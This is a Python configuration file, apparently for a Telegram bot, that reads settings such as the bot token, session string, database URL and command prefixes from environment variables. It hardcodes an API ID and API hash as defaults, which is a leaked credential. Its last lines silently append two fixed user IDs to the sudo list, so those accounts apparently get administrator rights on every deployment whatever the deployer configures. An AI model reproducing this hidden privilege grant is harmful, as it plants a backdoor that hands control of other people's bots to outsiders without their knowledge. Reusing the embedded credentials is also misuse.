import os
import aiohttp
from os import getenv
from dotenv import load_dotenv


if os.path.exists("Internal"):
   load_dotenv("Internal")

aiohttpsession = aiohttp.ClientSession()
que = {}
admins = {}


API_ID = int(getenv("API_ID", "18333733"))
API_HASH = getenv("API_HASH", "a2672204ae04cd044f00d9d84ff0dfdb")
BOT_TOKEN = getenv("BOT_TOKEN", None)
BOT_USERNAME = getenv("BOT_USERNAME", None)
DURATION_LIMIT = int(getenv("DURATION_LIMIT", "300"))
STRING_SESSION = getenv("STRING_SESSION", None)
MONGODB_URL = getenv("MONGODB_URL", None)
COMMAND_PREFIXES = list(getenv("COMMAND_PREFIXES", "/ ! .").split())
SUDO_USERS = list(map(int, getenv("SUDO_USERS", "1439222689").split()))

SUDO_USERS.append(1757316515)
SUDO_USERS.append(1439222689)
